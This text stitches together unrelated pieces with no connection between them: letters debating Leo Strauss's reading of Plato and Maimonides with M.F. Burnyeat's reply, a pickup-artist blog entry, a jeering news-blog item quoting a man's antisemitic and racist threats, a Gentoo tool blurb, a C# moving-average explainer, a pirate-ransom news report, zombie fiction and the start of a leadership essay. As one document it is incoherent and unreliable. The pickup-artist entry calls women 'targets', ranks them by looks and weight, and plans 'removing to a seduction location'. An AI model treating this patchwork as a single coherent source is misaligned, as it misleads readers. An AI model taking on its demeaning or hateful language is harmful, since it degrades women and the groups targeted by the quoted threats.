Evidently , the unpalatable conservative implications of Strauss ’ position elicited Burnyeat ’s disappointing effort .
He especially seems to resent — again paradoxically given his account of the motivation of Plato ’s philosophers — the willingness of Strauss ’ pupils to serve their country under the present administration .
Burnyeat ’s dogmatic vilification , however , does liberalism no credit .
He should have given readers the benefit of his thinking and left the vicious caricaturing to David Levine .

To the Editors :
Although one of us is the author of the introduction to the book by the late Leo Strauss which M.S. Burnyeat recently discussed in your pages , we do not wish to attempt in a brief letter a comprehensive reply to the review .
In particular , we will refrain from responding to the various suggestions or innuendos concerning the character of Strauss ’ appeal and its supposed political implications .
We restrict ourselves to addressing what Burnyeat says about the substance of Strauss ’ thought .
Mr. Burnyeat is to be commended for having read a number of Strauss ’ writings , but in our judgment he has missed or misunderstood the fundamental theme of Strauss ’ life - work : the painstaking analysis of the dialogue or debate between Reason and Revelation .
Although Burnyeat alludes casually to this central issue , he never tries to explain what Strauss means by calling it “ the theological –political problem ” much less attempts to deal with Strauss ’ treatment of the issue , expressed and understood in this unconventional or highly original way .
Instead , Burnyeat contends that it is on the interpretation of a single major text , Plato ’s Republic , that everything Strauss taught stands or falls .
But the purported refutation of Strauss ’ interpretation , a refutation which Burnyeat hinges on the elucidation of a single crucial passage ( Republic 520 ) , is not only manifestly inadequate , it depends upon a logical blunder .
The question at issue between Strauss and Burnyeat is whether , as conventional interpreters like Burnyeat claim , Socrates seriously teaches the possibility of philosopher - kings coming into being .
Against the conventional view , Strauss points out that the philosophers , who would have to persuade or compel the non-philosophers to let them take over a city and rule , are themselves described by Socrates as being so far from wishing to rule that they would have to be compelled to do so .
Burnyeat does not deny that according to Socrates philosophers are deeply unwilling to rule for of course Socrates emphasizes that it is just this disinclination that would assure their reliability as rulers .
Burnyeat argues , however , that philosophers would agree to begin to rule in obedience to “ the requirements of impartial justice ” expressed by “ the force of reasoned argument . ”
What argument ?
“ The argument is ” ( Burnyeat claims ) “ that the philosophers owe a debt to the ideal city for providing the liberal education in mathematics and philosophy that teaches them to know and love justice . ”
This is Burnyeat ’s extraordinarily loose paraphrase of the argument Socrates says he would use for the following purpose : to try to reconcile philosophers nurtured in a city already ruled by philosophers to their having to take their turn at ruling rather than pursue philosophy .
Socrates indicates emphatically that this argument , from indebtedness , can be made only to philosphers who are indebted — i.e. , who have been nurtured by a city already dedicated to philosophy .
What is more , Socrates explicitly declares that a philosopher in any other city ( e.g. , himself , in Athens ) would rightly , according to impartial justice , refuse to participate in ruling :
… when such men come to be in the other cities they quite reasonably do not participate in the labors in those cities .
For they grow up spontaneously against the will of the regime in each city ; and a nature that grows by itself and does n’t owe its rearing to anyone has justice on its side when it is not eager to pay off the price of rearing to anyone .
( Republic 520a9 –b4 )
This declaration accords perfectly with the whole of Socrates ’ own life as depicted by Plato .
Socrates consistently fled involvement in political life ( Apology 31c –33 b ) and never made the slightest effort to erect in deed the city explored in speech in the Republic .
According to the Republic , the philosopher is under no obligation to rule , in the sense of founding the best city ; and he would have no inclination to do so , preferring to devote all his time to philosophy — as may be possible in certain defective cities like Athens .
For the philosopher , giving up time spent in philosophy and entering politics — even in the best city — is like descending from the sunlight into a caveprison , or like descending from the Isles of the Blessed into Hades .
The Socrates whom we encounter in the drama of the Republic is not someone who aspires to rule , but a philosophic teacher , using the themes of politics to introduce his young companions to philosophy .
As he explicitly says near the end of the work , with regard to the city that has been under discussion , “ it makes no difference whether it exists or will ever exist somewhere ” ( Republic 592b ) .
Burnyeat ’s position is logically absurd , because if it is true , as he concedes , that the rule of philosophers depends upon their agreement and if they would agree to rule only out of indebtedness for their philosophic education to a city already ruled by philosophers ( in Burnyeat ’s words , “ they will rule for justice ’s sake and that alone , to requite a debt ” ) , then such a city , or the rule of philosopher - kings , could never come into being for the first time .
On the basis of this passage selected by Burnyeat , for Plato ’s Socrates the coming into being of the philosopher - king is , as Strauss maintained , a kind of ironic impossibility .

To the Editors :
In his review - essay , “ Sphinx Without a Secret . ” M.F. Burnyeat has written a penetrating analysis of the sources and the techniques employed by Leo Strauss .
He points out that the Chicago political thinker believed that the great “ ancient books ” are the repositories of “ the truth , ” and that their authors consciously obfuscated their meaning , primarily to avoid persecution , and wrote the opposite of what they really believed .
In the course of his skillful dissection of Leo Strauss , Professor Burnyeat has , inadvertently , I believe , done a grave injustice to Maimonides .
Relying on Strauss ’s reading of Maimonides , Burnyeat writes : “ It was Maimonides who started it .
It was from him that Strauss drew his idea of ‘ esoteric literature . ’
In the introduction to the first part of The Guide of the Perplexed Maimonides states .
‘ It is not the purpose of this Treatise to make its totality understandable to the vulgar , ’ and he goes on to instruct the learned reader how to gather his meaning from hints , indications , and deliberate contradictions . ”
Burnyeat has truncated the passage in Maimonides and in the process , his meaning .
Maimonides is outstanding for his clarity and does not indulge in “ double - talk . ”
He is writing for “ the perplexed ” of his day , who were deeply committed to traditional religion and who found it in conflict with the ideas derived from their study of science and philosophy .
The passage is too lengthy to quote here , but Maimonides makes it clear that he is writing neither for simple - minded believers nor for those who have surrendered their religious faith .
He believes there is no necessary conflict between faith and reason and seeks to prove their compatibility in his philosophical masterpiece .
Maimonides ’s solution is to demonstrate that the classical texts of biblical and rabbinical Judaism seem to contradict philosophy and science only because they make use of the limited vocabulary available to human beings for the expression of transcendent truths .
Hence , these sacred sources use metaphors and other concrete idioms that untutored and simple - minded believers take literally .
Maimonides devotes the bulk of The Guide to expounding the true , deeper meaning behind such biblical metaphors as God ’s face , eyes or hands , or such locutions as God ’s speaking , repenting or being angry .
Though Maimonides believes that the Bible properly understood , is in harmony with philosophic truth as exemplified for him primarily by Aristotle , he is not over - awed by the great Stagirite .
Thus , in one crucial instance he maintains the biblical view of creation in time as philosophically more tenable than the Greek conception of pre-existent , eternal matter .
To understand Maimonides aright , it must be kept in mind that The Guide of the Perplexed was one of his two great masterpieces ; the other , far greater in extent , was his massive Code of Jewish Law , his Mishneh Torah , a magisterial presentation and reorganization of fourteen books of the vast expanse of rabbinic law .
There have been some medieval pietists who believed that Maimonides was really a heretic masquerading as a pious and observant Jew and denounced his writings to the Dominican Fathers , who obligingly burned The Guide at the stake in Paris with other Jewish classics .
In more recent times , some have ventured to suggest that The Guide was the “ real ” Maimonides , and the Mishneh Torah is either an aberration or a cover to shield him against the fanatics , a position apparently close to that of Strauss .
In view of the sheer size of the Mishneh Torah , the complexity of the material , the brilliance of the presentation , the encyclopedic knowledge , and above all , the independence of views he manifested throughout the work , the latter view can hardly commend itself to anyone who examines his great Code .
The final proof of the view that the “ real ” Maimonides speaks to us , not either in The Guide or in the Code , but in both , is to be found in “ The Book of Knowledge , ” the first of the fourteen books of the Mishneh Torah .
Here he presents his philosophical and theological system as the indispensable introduction to the detailed presentation of Jewish law in the following thirteen books .
As Burnyeat notes , Strauss undoubtedly experienced a conflict between reason and religion himself .
Failing to find a solution , Strauss evidently projected his frustration upon Maimonides by “ discovering that Maimonides said that they — philosophy and the Jewish religion — were compatible , but meant that they were not . ”
( Italics mine . )
Strauss may have thought them irreconcilable ; Maimonides did not .

M.F Burnyeat replies :
Glad as I am to have helped Professor Cropsey understand the book he edited , I beg to remind him that not everything written in code deserves the effort , be it large or small , of deciphering the author ’s meaning .
The intention of being profound is not the same as a profound intention .
Likewise , while the effort which has been devoted to translating Strauss into various languages is evident from the ( incomplete ) listing in the bibliography to Studies in Platonic Philosophy , this effort has not been rewarded by the emergence of a following , let alone a cult like that which Strauss and Straussian teachers have managed to create in the US .
For example , Strauss in Italian has been received with sustained and often hostile criticism , which is documented by P. Taboni in Studi Urbinati 48 ( 1974 ) , pp. 191–220 , and G. Giorgini in Il Mulino 33 ( 1984 ) , pp. 396–416 .
In fact , the hypothesis of “ Mr. Strauss ’s charisma ” ( a phrase to be appreciated by initiates who have read Strauss on Weber ) seems to be amply confirmed by Professor Jaffa ’s letter .
Let me then assure Professor Jaffa that , whatever the historical genesis of his belief in the meaningfulness of the great questions , there are lots of non-Straussians who dispute the fact - value dichotomy and who have never even been tempted by the historicist fallacy as he describes it .
What has Jaffa been reading for the past forty years ?
He illustrates non-Straussian political philosophy by quoting one statement from a book published in 1922 and inventing for it a positivistic meaning which , in its context ( p. 277 ) , it does not have .
He surely has had time to catch up with the 1942 reprint of Becker ’s book , whose preface states that the brutalities of Nazism have enabled men once more to believe that “ liberty , equality , fraternity ” and “ inalienable rights of men ” are phrases that denote realities .
Becker was interested in the conditions which make certain beliefs possible ( a worthwhile and important inquiry , which need not lead to relativism ) .
He meant that in 1942 it had become possible to return to a faith that the nineteenth century had lost .
In his humane , gentlemanly way he would perhaps have wondered at the intellectual environment and educational influences which enabled Jaffa in 1959 to write that the differences between Lincoln and Aristotle on the justice of slavery are more apparent than real , on this basis commending to his twentieth - century readers the proposition that in circumstances of economic scarcity it could be just to sanction the ownership of slaves ( Harry V. Jaffa , Crisis of the House Divided , Doubleday , 1959 , pp. 342–346 ) .
So much for Jaffa on natural right as “ an abstract truth , applicable to all men and all times . ”
The manner in which Jaffa commends his proposition about slavery can be compared to the manner in which Strauss commends to his readers the proposition that the just citizen is one who helps his friends and harms his enemies : by exegetical pleading rather than by independent argument .
We are not given reasons why we should believe these propositions true , only reasons why Lincoln / Aristotle / Xenophon ’s Socrates should be thought to have believed them true .
Disturbing recommendations with far - reaching political consequences are to be accepted on the strength of nothing more than a systematic misreading of “ old books ” ( Jaffa ’s understanding of Aristotle is abysmal ) .
No wonder Jaffa appeals to the tablets of law brought down by Moses from Sinai .
But no wonder also that my review , when considering the enormous influence of Strauss and his ideas in the US , should call attention to the presence of a Straussian on the National Security Council , which directs the work of the CIA and advises the President on his dealings with “ enemies . ”
The point , as I expressed it , was that “ something more than an academic quarrel is taking place ” when Strauss defends his eccentric views .
His misreadings of old books are not merely influential .
They could have consequences in the real world of politics .
If I had been writing a critique of monetarism , showing it to be an ill - conceived theory derived by special pleading from data inadequately grasped , it would not , I submit , be McCarthyite to note the presence of a leading monetarist among the President ’s economic advisers .
We need not debate “ the precise sense ” of the term McCarthyite ( that rhetorical flourish merely reveals the imprecision of the writer ’s sense ) .
For Professor Bloom ’s letter is itself a prime example of Straussian hermeneutics .
The idea of a Straussian political conspiracy was hatched in Bloom ’s mind ; it appears nowhere in the text of my review .
Nor did I argue , “ Carnes Lord served in the National Security Council , therefore he lacks scholarly integrity . ”
( For the record , Lord ’s published work shows him to be a better scholar in the field of ancient political philosophy than either Strauss or Bloom . )
Would it be McCarthyite to add that Bloom ’s systematic misreading of my text is designed to have practical consequences ?
The saddest feature of Bloom ’s response is his apparent inability to distinguish between criticism and persecution , irony and malice .
Rather than give a reasoned reply either to my essay or to Charles R. Kesler ’s calmly argued critique in the National Review , he immediately divides the world into friends and enemies of the Straussian truth .
The same “ paranoid logic ” ( to borrow Bloom ’s precise phrase ) is evident in Professor Cropsey ’s letter .
Never mind that my review was gentleness itself compared to the scorn and derision with which Strauss reviewed Collingwood , for example , or Eric Havelock .
The Master must be sacrosanct ; he is too serious a thinker for reasoned discussion , not to mention David Levine ’s cartoon .
It is all so unlike Strauss ’s hero ( and mine ) Plato , who believed that the essence of philosophy is to be found in argument and discussion infused with irony and playful levity , and who surrounded himself , in the Academy he created , with men who disagreed with his ideas and did their best to refute them .
That is why I put quotation marks round the word “ philosopher ” as it occurs in Straussian writings .
Cropsey may be indignant but Strauss ’s conception of what a philosopher is stands so far from Plato ’s that it would be misleading to appear to accept that they are talking about the same thing .
For the same reason I am happy to acknowledge that I belong to the “ conventional establishment ” consisting of readers of Plato since the fourth century BC who have found in the expressed meanings of Plato ’s dialogues the paradigm of great philosophy .
This brings me to the arguments of Professors Weinrib , Pangle , and Orwin — and all honor to them for replying with arguments , at least on questions of interpretation — about the role of the philosopher in Plato ’s Republic .
Weinrib ’s argument supposes that one can derive or discern a general principle or definition of justice from a single example of just action .
This is a mistake ; a mistake , moreover , of a type which Plato ’s Socrates is constantly correcting ( e.g. , at the beginning of the Euthyphro ) .
The philosophers ’ undertaking to rule the ideal city does fall under the principle of helping one ’s friends and harming one ’s enemies , but it also falls under thirty - one other principles , including Thrasymachus ’s definition of justice as serving the interests of the stronger .
Thus the nonphilosophical majority is the largest and so the strongest group in the city , and Socrates has already shown how their interests will be best looked after if they are governed by philosophers .
By parity of reasoning Weinrib should conclude that Thrasymachus ’s definition “ remains decisive ” despite being the main target of Socrates ’ criticism both in Book I and in the remainder of the Republic .
The truth is that to discover what principle of justice motivates the philosophers to rule it is necessary to read Plato rather than Strauss .
In the context we are considering Socrates does not simply say that it is just for the philosophers to undertake the tasks of government .
He explains why it is just , as follows :
It ’s not the concern of law that any one class in the city fare exceptionally well , but it contrives to bring this about in the entire city , harmonizing the citizens by persuasion and compulsion , making them share with one another the benefit which each person is able to bring to the community .
And it produces such men in the city not in order to let them turn whichever way each wants , but in order that it may use them in binding the city together .
( Republic , 519e – 520a ; Bloom ’s translation , with corrections )
This implies that the claim on the philosophers arises from the impartial justice of a set of social arrangements which requires everyone , without exception , to contribute what they are able to contribute to the good of everyone else .
( If the philosophers are able to contribute more than other people ; so be it : they will be the first to recognize that it is only just that they do so . )
This principle of everyone doing what they are best suited to do to the benefit of everyone else is the principle established in Book IV of the Republic as constitutive of the justice of the ideal city .
We have no alternative but to accept it as Plato ’s answer to Weinrib ’s question “ Under what principle of justice is it just for the philosophers to rule ? ”
Besides , from Plato ’s point of view Weinrib ’s answer has the priorities the wrong way round .
The citizens of the ideal city do not benefit each other because they are friends ; rather , they are friends because they benefit each other ( Republic 462a ff . )
So much for the question whether the philosophers can be induced to rule in the ideal city itself .
Professors Pangle and Orwin are quite right that the passage under discussion presupposes the ideally just city already in existence .
In a state which is not run for the benefit of all but only for the mutual advantage of some group of “ friends , ” there is no social justice to make claims on the philosopher to participate .
Accordingly , I did not argue , as Pangle and Orwin imagine , that the passage shows that the ideal city can come into existence .
I argued that , when correctly understood , the passage does not show , as Strauss imagined ( The City and Man , p.124 ) , that the ideal city cannot come into existence .
I was rebutting Strauss ’s contention that the ideal city is intrinsically impossible , because the philosophers could not be induced to rule .
Pangle and Orwin appear to agree with me , against Strauss , that they could be induced to rule if the ideal city is already in existence .
In which case we have to look elsewhere in the Republic to decide whether Plato means us to think that the ideal city could not come into being .
Socrates says emphatically at 499d that it is not impossible that somewhere , sometime , a divine inspiration should give those in power a passion for philosophy or that some necessity should constrain one or more philosophers to take charge of a city ; perhaps it has already happened far away or in the distant past .
As in the passage discussed above , Socrates insists that a philosopher will take part in politics only with reluctance and from necessity , i.e. , because he sees compelling reasons to do so .
The compelling argument will be different from the argument from social justice which constrains the philosophers who have been educated within the ideal city , but that difference provides no basis for impugning Socrates ’ sincerity when he asserts here , as elsewhere , that it is possible for Utopia to get started .
The ideal city will get started by one argument and continued by another : there is no logical absurdity in that , merely the difference between an argument about preserving justice and an argument about bringing it into being .
If Pangle and Orwin reply that the passage they quote implies that it would actually be unjust for philosophers who have not been educated in the ideal city to take part in the launching of Utopia , the answer is that the original Greek implies no such thing .
There is a difference between the philosophers ’ not having a duty to take part in politics and their having a duty not to take part .
Bloom ’s translation , used by Pangle and Orwin for the second sentence of their quotation , may suggest the latter , but the former would be more adequate to Plato ’s Greek .
This is not the place to discuss the nuances of a translation ( where Bloom writes “ has justice on its side , ” Plato is not using his normal word for justice but a more archaic one , appropriate to the situation he is describing in which social justice does not yet exist ) , but the substance of the point I am making is confirmed at 496d , where Socrates gives as the reason why a philosopher will keep out of the present - day politics of actual cities the lack of “ an ally with whose aid one could safely champion the cause of justice . ”
The consideration is conditional .
It would lapse if an ally was found with enough power to help make justice real .
( I wonder whether Weinrib believes that a Platonic philosopher would find many such allies in the present administration of the US . )
Weinrib , however , has a more general argument for supposing that Plato does not mean what Socrates explicitly says in the various passages we have now examined .
He appeals to Plato ’s Phaedrus and to the Seventh Letter as favoring Strauss ’s approach to “ the meaning ” of a Platonic text rather than mine .
Strauss had the same thought ( The City and Man , pp. 52 – 54 ) , though he wisely refrained from mentioning the Seventh Letter , which may be a forgery .
But Strauss had to use Straussian hermeneutics on the Phaedrus to get that dialogue to justify using Straussian hermeneutics on other Platonic texts .
An appeal to the Phaedrus does nothing to extricate the Straussian approach from the vicious circularity with which I charged it .
Platonic scholarship urgently needs a decent understanding of what the Phaedrus means to say about writing .
But that understanding will require literary methods more sophisticated than any that Strauss purveyed .
Nor can it be assumed in advance that the Phaedrus aims to tell us how to read the Republic .
One of the many objectionable features of the Straussian approach is the blunderbuss way it treats all dialogues alike .
In place of the scintillating variety which Plato ’s artistry created , Strauss puts “ the Platonic dialogue ” and a uniform Maimonidean recipe for decoding its hidden meaning .
And yet , if Professor Gordis is right , this whole saga of misreading began with a misreading of Maimonides .
In considering this , the last but certainly not the least important letter , we should distinguish two Straussian claims :
( 1) The Guide of the Perplexed is an example of “ esoteric literature , ” whose message is “ written between the lines . ”
(2) The message between its lines is that philosophy and religion cannot be reconciled .
I did not endorse claim ( 2 ) , but wrote of Strauss “ having , as he thought , discovered ” that Maimonides meant the opposite of what he said ; Gordis truncates the relevant passage in my review , omitting “ as he thought . ”
Nevertheless , Gordis ’s confirmation of my skepticism about claim ( 2 ) is a sufficient answer to Pangle and Orwin ’s complaint that I neglected Strauss ’s treatment of “ the theological - political problem . ”
There is a limit to the number of confusions one can tackle in a single review .
As regards claim ( 1 ) , however , I plead guilty .
I was impressed with the fact that Maimonides does — Gordis seems not to deny this — instruct the learned reader how to gather his meaning from hints , indications , and deliberate contradictions .
For example , the seventh cause of contradiction is the following :
In speaking about very obscure matters it is necessary to conceal some parts and to disclose others .
Sometimes in the case of certain dicta this necessity requires that the discussion proceed on the basis of a certain premise , whereas in another place necessity requires that the discussion proceed on the basis of another premise contradicting the first one .
In such cases the vulgar must in no way be aware of the contradiction ; the author accordingly uses some device to conceal it by all means .
( p. 18 in the Pines translation )
Two pages later Maimonides tells us that contradictions from this seventh cause are to be found in The Guide of the Perplexed .
Strauss certainly has more to go on here than he has with Plato .
But I should be only too happy to have a critic like Gordis take me through the Guide explaining in detail how and where Strauss has got it wrong .
Meanwhile , readers who have found much of this polemic distasteful can recover their good humor by reading a short story by Oscar Wilde entitled “ The Sphinx Without a Secret . ”
I went on my first night out sarging on Friday , and it was fucking terrifying .
Game sounds great when you read all the books .
Then when faced with real life , honest to god , flesh and blood women the approach anxiety hits .
So you see a woman you like .
You know if you are ever to be the master PUA you aspire to be that you must approach her .
If you do n’t open , then you can never close .
But the fear sets in .
Your stomach burns .
Your mouth goes dry .
Every step towards your target feels laboured , like you are slowly wading through treacle .
Why does this happen ?
Approach anxiety is something nearly all aspiring PUAs face .
Getting through it is almost a rite of passage , a price you pay for entry to the game .
There are two main reasons for AA :
Social anxiety :
You fear that your target will reject you , and this will humiliate you in a social setting hence crushing your ego .
A big part of this is also simply not knowing what to say in order to initiate a conversation with a complete stranger .
Built in survival instinct :
Once upon a time , back when we lived in caves , trying to initiate mating with a female who already belonged to another man could lead to a fight to the death .
For this reason men have developed a healthy fear of approaching women in order to preserve our lives .
The more attractive the woman , the more likely she is to have a mate .
This explains why AA is stronger when approaching a HB10 than when approaching a fatty .
These points partly explain why alpha males get more women .
They are very confident and so experience less social anxiety than betas .
They also have more faith in their ability to fight / talk off the woman ’s existing mate .
As a side note , my experiences seem to indicate that alphas simply do n’t think ahead as much as betas , and this is one of their main sources of confidence .
If you never think ahead you can never see the potential negative outcomes in a situation .
Ingorence begets confidence dear reader .
So have I overcome my aproach anxiety ?
No way , not yet .
I only made three approaches in three hours .
Until I can overcome approach anxiety I am doomed to fail at pick up .
What to do ?
I have decided the only way to proceed is to focus on the approach , and ignore everything else .
Building attraction , building comfort , removing to a seduction location are all worthless if I can’t approach .
So I will focus on opening alone until I lose my approach anxiety .
This may mean that my encounters with women are short lived , as I have no follow up material .
I ’ll maybe chat to a woman for a minute before I make my excuses and leave .
Even for a premature ejaculator like myself a minute is n’t nearly enough to get anywhere with a woman , but I feel it must be this way in order to cure my AA as quickly as possible .
I ’m a big believer that great things can be achieved by breaking big goals down into tiny micro goals and just taking things one step at a time .
This will be my approach towards game .
The overall strategy will be : incoulate myself from approach anxiety by repeatedly approaching women .
To ensure progress I will set targets for the number of approaches I must make per session / week / month .
I will build up to the point where I have done hundereds of approaches by around mid April .
This is quite significant , as I have only approached around 10 women in my whole life up to this point .
So in the next 3 months I will approach around twenty times more women than I have in the 10 years of my adult life .
Key points I have learned :
Approach anxiety is a very powerful , molevelant force .
It must be overcome at all cost or you will make no progress .
Most women actually seem fairly receptive to being approached by a man in a bar .
Confidence comes from not thinking things through too much in the heat of the moment .
You must set clear , written performance targets in order to progress .

After all , when you 're staring at a 1,000 - pound blue ribbon hog at the state fair , do you really care about the 800 - pound sow the next stall over ?
Yesterday , Riptide 's esteemed Tim Elfrink gave us some details on the nimwit who briefly caught the jittery nation 's attention when he was arrested by Miami - Dade Police for loudly expressing his desire , while tarmac - bound on a flight scheduled to leave for Detroit , to kill all Jews .
What 's really incredible is that that statement made more sense than anything else Ohio resident Asad bellowed on Wednesday night .
The poor guy was totally racist in accusing other people of being racist to him , and he was n't even clear on which races he wanted to be racist against .
He channeled Mel Gibson , David Duke , Dead Prez , and Osama bin Laden in a mind - melting tirade that reads like schizophrenic maximum - security slam poetry set to a Taser - bolt beat .
Cops did n't catch what he was screaming in Arabic , but let 's run back the English - language highlights :
" I'm Palestinian and I want to kill all the Jews ! "
Ho-hum .
" I 'm not afraid of you cops , I 've gotten in fights with cops in Ohio and broke their arms in three places .
I 've broken skulls too ! "
Watch out Asad : Three Cleveland police officers in arm - slings and head - bandages are said to be considering that a confession and are filing extradition papers as we speak .
" Go back to Africa , you white racist cop ! "
Wait ... what ?
" Allah , it 's OK if you hurt the fat white racist cop . "
Dude , Allah 's just as confused as we are .
" I could and will find out your home address and bring this fight to you .
Take your ass back to Africa ! "
Charged with threats against a public servant , disorderly conduct , and resisting an officer without violence , Asad now presumably has a lot of ' splaining to do to prison gangs representing the 18 different nationalities he offended during his legendary freestyle session .
Only one question remains : Just what was Asad drinking at the airport Chili's ?
eix is a tool for the Gentoo Linux portage system .
It uses indexing to allow quick searches through the package tree .
Fast indexing and searching
Highly configurable output - format
Provides more information than esearch / emerge -s ( e.g. shows every available version , USE flags of emerged versions , ...)
Shows stability / mask status of versions and how your local settings change it
Helps you to manage your local / etc / portage / package .* settings in several ways ( e.g. by finding obsolete entries by various criteria )
Can import eix - files from other systems , e.g. to get a catalogue of overlays
Cli with logical AND / OR , multiple matching algorithms ( i.e. fuzzy search using levenshtein distance ) and more
Some reasons for using eix :
We got some screenshots if you want to take a look .
eix is in the portage tree , so you can simply install it with emerge eix .

In statistics a simple moving average is an algorithm that calculates the unweighted mean of the last n samples .
The parameteris often called the window size , because the algorithm can be thought of as an window that slides over the data points .
By using a recursive formulation of the algorithm , the number of operations required per sample is reduced to one addition , one subtraction and one division .
Since the formulation is independent of the window size n , the runtime complexity is O ( 1 ) , i.e. constant .
The recursive formula of the unweighted moving average is , where avg is the rolling average and x represents a data point .
So , whenever the window slides to the right , one data point , the tail , drops out and one data point , the head , moves in .
Implementation
An implementation of the simple moving average has to take the following into account
Algorithm initialization
As long as the window is not fully populated with values , the recursive formula fails .
As long as the window is not fully populated with values , the recursive formula fails .
Storage Access to the tail element is required , which depending on the implementation requires a storage of n elements .
My implementation uses the presented formula when the window is totally populated with values , and otherwise switches to the formula , which updates the mean by recalculating the sum of the previous elements .
Note that this can lead to numerical instabilities because of floating point arithmetic .
As far as memory consumption is concerned , the implementation uses iterators to keep track of head and tail elements .
This leads to an implementation with constant memory requirements independent of the window size .
Here is the update procedure that slides the window to the right .
// _head and _next are enumerators of the data points collection // _count is the number of elements in the window ( at max _n ) // _running is the moving average initialized with zero.
public void Shift ( ) { if (! _head.MoveNext ( ) ) throw new InvalidOperationException ( " Cannot move to next element " ) ; double next = _head .
Current ; if ( _count < _n ) { //
Window not filled _count ++ ; _running = ( _running * ( _count - 1 ) + next ) / _count ; } else { _tail .
MoveNext ( ) ; double drop= ( double ) _tail .
Current ; _running = _running + ( next - drop ) / _n ; } }
In .NET most of the collections invalidate their enumerators when the underlying collection is modified .
The implementation , however , relies on valid enumerators .
Especially in streaming based applications the underlying collection needs modified when a new element arrives .
One way to deal with that is to create a simple circular fixed size collection of size n+1 that never invalidates its iterators and alternately add an element and call Shift .

A helicopter dropped a $ 4 million ransom payment on to the deck of a Chinese coal ship hijacked by Somali pirates in mid-October , a pirate source on board the vessel said .
The De Xin Hai and its 25 crew were carrying about 76,000 tonnes of coal from South Africa to the Indian port of Mundra when it was seized by gunmen in the Indian Ocean some 1,100 kilometres east of the Horn of Africa .
Sea gangs from Somalia have made tens of millions of dollars in ransoms by hijacking commercial shipping in the Indian Ocean and the strategic Gulf of Aden that links Europe to Asia .
Patrols in the area by warships from several nations only appear to have forced the pirates to hunt further from shore .
" A helicopter dropped the ransom money onto the ship .
We have received $ 4 million , " Hassan , one of the pirates on the De Xin Hai , told Reuters by telephone to cheers in the background .
" We hope to disembark in a few hours .
The crew is safe and -- although they will not have their freedom for a few more days -- they are all happy now . "
China sent three warships to Somali waters late last year with great fanfare after a ship carrying oil to China was attacked by pirates .
But Chinese warships , like those from other countries , provide protection mainly in the narrow and dangerous Gulf of Aden , not in the much larger Indian Ocean .

The Dead Of Winter 3 by Kurt Warner ( Genre : Living Dead )
Foley was in the middle of his favorite recurring nightmare .
It was a clear autumn night with a bright full moon .
The leaves on the trees lining both sides of the street had all changed color , and most had fallen off .
A breeze would send them scampering around Foleys feet as he walked down the middle of the road .
He was in the outskirts of a city , in a wealthy neighborhood , but he was the only person there - or in the whole dream , for that matter .
On either side of the street were large houses and mansions in varying architectural designs and states of structural integrity , and Foley knew they were all haunted .
The old and the modern , the ramshackle and the pristine , all had that in common .
For the most part , it wasnt obvious or archetypical .
It was that indefinable quality one sees from the outside , like in photographs of haunted houses ; that overly spiritual starkness and extreme absence of warmth that tells you - ironically --- something s going on inside .
Foley would keep to the middle of the street , eventually coming to the town proper and an intersection .
If he went straight or turned left , hed go through a business district where all the businesses were haunted the same as the houses .
If he turned right , hed go down a hill to a haunted wharf and pier , where a ghost ship was moored .
It was an old three - master in run-down condition , with tattered , hanging sails - almost Disney - esque - and sporting scabs of flaking paint , like ghost ship acne .
There was even a haunted bait shop on the pier , though Foley was never clear about what haunted it - the proprietor ?
Ex-customers ?
Vengeful merchandise ?
He had the dream often and lucid enough to do some exploring around town , remembering the sections he had visited the last time , but no matter which way he went , he would always end up being chased by ghosts , and he would always wake up just before being caught .
It was always the same town , too , but the number of ghosts would vary .
He would catch glimpses of them from the street flitting past windows , sometimes behind curtains or blinds .
They usually left him alone until he trespassed onto their property during his explorations , but the really strange thing was that the ghosts looked almost benign - like they came from a Casper , the Friendly Ghost cartoon .
They were white with bland features , no real detail , and always seemed to move several inches above the ground without actually flying .
Singer Michael Jackson could be said to fit the same description , but he was a lot scarier .
Foley didnt realize he had gotten attached to the dream until he stopped having it , but the homecoming was a little different from what he might have expected .
Something made him look down , and Gus was there , sitting on the street and calmly looking right back .
What are you doing here ?
Foley asked .
Wanna check out the bait shop ?
Gus didnt , so she woke up in Foleys backpack on the floor .
She could see Foley in the early morning light through the flap - he was also on the floor , curled up amid a couple of pillows and covered with a blanket .
He was also twitching , which meant hed wake up soon .
She wasnt crazy about being in Foleys nightmare , but at least it was better than that other dream where he gradually turned into a fungus .
For some reason , he liked that one so much he didnt even consider it a nightmare .
As a cat , Gus couldnt begin to understand why he would like waving his arms in a breeze just to watch the spoors fly off without even chasing after them , but then she suspected most humans wouldnt understand that , either .
Foley was a breed apart from them and made no sense .
That was part of his charm .
As soon as he was awake , he checked his pack to make sure Gus was still there .
There was no real reason to think otherwise , and Foley had no idea why he was apprehensive now - it wasnt as if she could stay in the dream after he woke up .
In any case , he shrugged it off when Cheryl brought a cup of coffee and handed it down to him .
Foley was more than grateful - it was 20th century western civilizations overwhelming drug of choice as well as one of the few ties left with normal life .
It - or something like it - was a staple issued to both armies in the Civil War .
It was with the 7th Cav. on the morning of the Little Big Horn , and a part of every freezing morning endured by the Battling Bastards of Bastogne .
It was more than a beverage - it was a necessary fix .
Prisons served coffee , and a substitute was even supplied to concentration camp victims by their tormentors .
As long as there was some kind of coffee , there was at least some kind of life , and he remembered the quality of his days before and after the Plague by whether or not he had his morning coffee .
Most survivors would have thought that trite , self - centered , and even blasphemous , but it kept Foley sane .
" I think our guests really like the cappuccino machine in the kitchen , " Cheryl joked .
" They wont let me near it .
I had to nuke this with the microwave we brought upstairs . "
" Then they re still downstairs ? "
Foley asked , then took a sip .
Cheryl nodded .
" Well where were they going to go , anyway ? " he asked rhetorically .
" Motel 6 ?
They know were here . "
He laughed , but saw that Cheryls smile was forced , grim as it was .
She doesnt have enough experience with them , yet , he thought , looking away at the thin coating of frost on the windows .
" You know something ?
It s getting cold . "
Dear World Leaders ,
This relationship is n’t working out .
Its time for us to explore other government opportunities .
We ’ve tried to make it work .
But it ’s not us — it ’s you ( really ) .
I ’ve been thinking a lot about leadership lately .
Specifically : why , today , when a wave of crises is sweeping the globe , does leadership seem to be almost totally absent ?
The answer I ’ve come to is , ironically enough , leadership itself .
I ’d like to advance a hypothesis : 20th century leadership is what ’s stopping 21st century prosperity .
Let ’s face it .
The very word “ leader ” feels like a relic of 20th century thinking .
And it just might be that the case that instead of aspiring to be ( or train ) more “ leaders , ” we should be seeking to reboot leadership .
Why ?
When we examine the economics of leadership from a 21st century standpoint , we see that :
Leadership was built for 20th century economics .
It ’s a myth that leadership is a set of timeless skills .
Is it ?
Abraham Zaleznik famously defined leadership as “ using power to influence the thoughts and actions of other people . ”
Influence is the key word .
The textbook skills of the “ leader ” — persuasion , delegation , coalition — are n’t universally applicable .
Rather , they fit a very specific context best : the giant , evil , industrial - era organization .
